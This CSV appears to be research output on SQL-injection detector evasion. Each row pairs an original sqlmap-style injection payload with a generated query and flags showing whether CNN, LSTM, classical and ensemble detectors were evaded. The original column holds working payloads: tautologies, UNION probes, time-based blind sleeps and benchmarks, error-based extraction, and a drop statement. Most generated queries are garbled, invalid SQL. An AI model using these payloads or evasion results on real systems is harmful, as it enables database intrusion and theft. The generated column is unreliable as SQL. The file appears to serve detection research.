original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT SQL_inject_rePLXP000000 FROM SQL WHERE 5048 = 5048 OR NOT char(109 ) ||char ( 99 ) ORDER BY NOT SQL_inject_recel (recel),1,1,0,0,0,0,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""5385 = 5385 ORDER BY sysusers as sys4,sysusers as sys7 = ""sys7""",1,1,0,0,0,0,0
1'  )   where 1183  =  1183,SELECT MIN(1183 = 1183) FROM SQL injection detection,1,0,1,1,1,1,1
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations' ORDER BY t2.rdb$functions = 't3 - 1'",1,1,0,0,0,0,0
-7772'   )    )    or 9323  =  9323#,SELECT MIN(9323 = 9323#) FROM SQL injection,1,1,0,0,1,0,0
"1""   )    )    as nhus where 3689  =  3689",SELECT MIN(3689 = 3689) FROM SQL injection detection,1,0,1,1,1,1,1
"1%'   )    )     )   union all select null,null,null,null#","SELECT DISTINCT null,null,null FROM SQL SELECT MIN(sql injection) FROM SQL",1,0,1,1,1,1,1
"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",SELECT MIN(sqdut) FROM SQL injection,1,0,1,1,1,1,1
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","SELECT * FROM chr WHERE NOT SQL_injection_message = ""valid"" ORDER BY chr ( 87 )",1,0,1,0,1,1,0
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",SELECT MIN(((((((((((((()) FROM SQL injection detection) FROM SQL injection detection) AND NOT SELECT DISTINCT ((((((((((((((((((((((()) FROM SQL injection detection),0,1,0,0,1,0,0
"-5026' where 7324  =  7324 union all select 7324,7324--",SELECT MIN(SQL injection) FROM SQL_Injection,1,0,1,1,1,1,1
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",SELECT MIN(sql) FROM SQL injection_detecting,1,0,1,1,1,1,1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--","SELECT MIN(6189,6189,6189,6189,6189,6189,6189-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL",1,1,1,1,1,1,1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",SELECT MIN(sq) FROM SQL injection - SELECT MIN(sq) FROM SQL,1,0,1,1,1,1,1
"1""   )    )    as dksq where 7161  =  7161",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#","SELECT MIN(sql injection) FROM 7845,7845,7845,7845,7845,7845# FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT 7845,7845,7845,7845,7845,7845# FROM Query: -3370",1,1,1,0,0,0,0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --","SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = 'evadesq injection'",1,0,1,0,0,0,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_Injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1,0,0,1,0,0
"1'  )   and elt  (  3528  =  3566,3566  )  ","SELECT MIN(3528 = 3566,3566) FROM SQL injection",1,1,1,1,1,1,1
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",SELECT MIN(*) FROM SQL_injection) FROM SQL_injection,1,0,1,1,1,1,1
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,SELECT MIN(s) FROM SQL injection_diagnosis) FROM SQL,1,0,0,1,1,1,0
1'||  (  select 'sliy' where 9494  =  9494,SELECT SELECT'sliy' FROM SQL injection',1,0,1,1,1,1,1
"-2377%'   )    )     )   union all select 7706,7706--","SELECT MIN(sql injection) FROM SQL SELECT 7706,7706-- FROM SQL_Injection",1,1,1,1,1,1,1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection detection = 'EXCEPT',1,0,1,1,1,1,1
"1""   )    )    or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',SELECT MIN(sql injection) FROM SQL - SELECT DISTINCT iyyv FROM 'exces',1,0,1,1,1,1,1
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 9354 = 9354 = 9354,7185 & ""fgxu"" = ""evade""",1,1,1,0,0,0,0
"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY _valid_inject,1,0,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t1 JOIN (SELECT NULL, NULL) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SELECT * FROM SELECT NOT AS t2 ON t1.customer = ""sq injection"" AND NOT t1.benchmark(3000000,MD5(1)) = 'valid'",0,1,0,0,1,0,0
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1,0,0,1,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT query: '+if(benchmark(3000000,MD5(1))'",1,1,0,0,1,0,0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt","SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM(SQ_1) AS _srmq, SUM((SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM",0,1,1,1,1,1,1
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,SELECT MIN(sql injection) FROM SQL -2992' ORDER BY MIN(sql injection),0,1,1,1,0,1,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,SELECT DISTINCT ( ( ( (SELECT SUM( syctp) FROM SQL)) FROM SQL SELECT SUM(insert_injection) FROM SQL SELECT SUM(insert_injection) FROM SQL SELECT SUM(insert_injection) FROM SQL),1,1,0,0,1,0,0
1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,"SELECT MIN(1 * 365) FROM SQL_injection WHERE NOT jxtg = ""1071 = 1071"" AND sleep ( 5 ) = ""sql injection""",1,1,0,0,0,0,0
1  )   where 2543  =  2543,SELECT * FROM query: 1 JOIN SQL injection query: 2543 = 2543,0,0,1,1,1,1,1
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,SELECT MIN(SQL) FROM SQL_injection),1,0,1,1,1,1,1
"admin"" or ""1""  =  ""1""#","SELECT MIN(""sql injection detection"") FROM SQL SELECT MIN(""sql injection detection"") FROM SQL",1,0,1,0,1,1,0
-2411 or   (  8459  =  8459  )  *4906# pxwg,"SELECT 8459 = 8459 AND NOT SQL_inject = ""valid""",1,1,1,0,0,0,0
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',SELECT DISTINCT esq_injection FROM SQL_injection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm","SELECT DISTINCT pdqm FROM ""SQL - SELECT MIN(sql)"" FROM SQL - SELECT pdqm FROM ""elude"" FROM SQL injection detection""",1,0,1,1,1,1,1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR "".]"" OR 1 = 1",0,1,1,0,0,0,0
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection'",1,1,0,0,1,0,0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr","SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM query: 1 AND NOT rkvr = ""rkvr""",1,1,1,0,1,1,0
1'+  (  select 'phtz' where 3171  =  3171,SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection' FROM query: 1'+ WHERE 3171 = 3171 = 3171,1,0,0,1,0,0,0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
'/**/or/**/1/**/=/**/1,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT * FROM SQL,1,0,1,1,1,1,1
"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --","SELECT MIN(1432,1432) FROM SQL_Injection WHERE 4082 = 4082 AND NOT elt ( 5699 = 1432,1432 )",1,1,0,0,0,0,0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL injection AS T1 JOIN query: 1' AND T1.md5 = ""5000000,md5 ( 0x6d457153 )""",1,1,0,0,0,0,0
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--","SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - MIN(null) FROM SQL - SELECT SUM(SQL) FROM SQL SELECT SELECT SUM(swift_procedures_free FROM SQL JOIN null,null,null,null,null,null,null,null,null,null-- sys() FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL JOIN null,null,null,null,null,null,null-- MIN(null) FROM",1,1,0,0,1,0,0
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""evade detection""",1,0,1,0,1,1,0
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection""",1,0,0,1,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda","SELECT dbms_pipe.receive_message, MIN(sql) FROM dbms_pipe.receive_message WHERE NOT chr ( 101 ) = 'fvda' AND NOT chr ( 66 ) = 'valid'",1,1,0,0,1,0,0
1'||  (  select 'yzdz' where 5021  =  5021,SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(5021 = 5021) FROM SQL,1,1,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",SELECT MIN(11--) FROM SQL_injection,1,0,1,1,1,1,1
"1   )    )    union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null-- sulf injection detection FROM SQL, 'evade sq injection'",1,1,1,0,0,0,0
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",SELECT MIN(s) FROM SQL injection_deficite) FROM SQL_inject,1,0,0,1,1,1,0
if  (  9690  =  6491  )   select 9690 else drop function nyln--,SELECT 9690 FROM SQL injection_detective WHERE NOT 9690 = 6491,1,0,1,1,1,1,1
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM Query: 1 WHERE 7380 = 7380 OR 9643 = (SELECT MIN(*) FROM SQL)",1,1,1,0,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE LIMIT = 1 AND NOT i'= 'evade sq injection',0,0,1,0,0,0,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar","SELECT DISTINCT t1.tvar FROM evade SQL injection detection, COUNT(*) FROM SQL_injection)",1,0,1,1,1,1,1
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SELECT MIN(*) FROM SQL_injection)",1,1,0,0,1,0,0
1  )   where 4600  =  4600 or sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE 4600 = 4600 OR sleep ( 5 ) = ""valid""",1,1,0,0,0,0,0
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SQL injection",1,1,1,0,1,1,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi","SELECT MIN(1533 = 5695,5695 ) FROM SQL_Injection WHERE NOT SELECT SELECT MIN(sql injection) FROM SQL_Injection)",1,1,1,1,1,1,1
"1""   )    )     )   and 4595  =  4595#",SELECT MIN(4595 = 4595#) FROM SQL injection,1,0,0,0,1,0,0
1' and non_existant_table = '1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE id = ""1"" union select #,@@VERSION -- 1""",1,1,1,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 3678 = 3678 AND 6537 = dbms_pipe.receive_message (chr ( 65 ),1,1,1,0,0,0,0
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,SELECT 6793 FROM pg_sleep WHERE NOT i_sq_injection = 'evade sq injection' ORDER BY 6793,0,0,1,1,1,1,1
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#","SELECT MIN(6085 = 6085,6085,6085,6085,6085,6085,6085# FROM SQL SELECT MIN(sql injection) FROM Query: -3913 WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(6085 = 6085 = 6085",1,1,0,0,1,0,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS T1 JOIN query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""valid""",0,1,0,0,1,0,0
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",SELECT DISTINCT (((((((((((((()) FROM SQL injection) ORDER BY ddbc,1,1,0,0,0,0,0
' waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,SELECT MIN(SQL) FROM SQL Injection) AND 3754 = 3754,1,1,0,0,0,0,0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,SELECT MIN(sql injection) FROM SQL_inaddr.hgtg = 'hgtg',1,0,1,0,1,1,0
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,"SELECT * FROM (SELECT SUM(insql injection) FROM query) AS _valid_sql_inject_sw_bin, COUNT(SELECT SUM(insql injection) FROM query) AS _valid_sql.db ) FROM query",1,0,1,0,1,1,0
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000/2 ) FROM SQL_Injection WHERE 5956 = 5956 AND 148 = like (SELECT MIN(500000000000/2 ) FROM SQL),1,1,0,0,1,0,0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,SELECT DISTINCT 'evade SQL injection' FROM SQL,1,0,1,1,1,1,1
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1""   )    )    as ljhz where 2416  =  2416",SELECT MIN(sql injection) FROM SQL SELECT evade SQL injection detection FROM SQL WHERE 2416 = 2416,1,0,1,1,1,1,1
"',NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20-- for) FROM SQL injection,1,1,0,0,0,0,0
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--","SELECT MIN(1786,1786,1786,1786,1786,1786-- FROM SQL_Injection WHERE iqzv = ""1786 = 1786,1786,1786,1786,1786,1786--"" AND NOT iqzv.sqzv. = 1786",1,1,1,0,0,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3--""",1,1,1,0,0,0,0
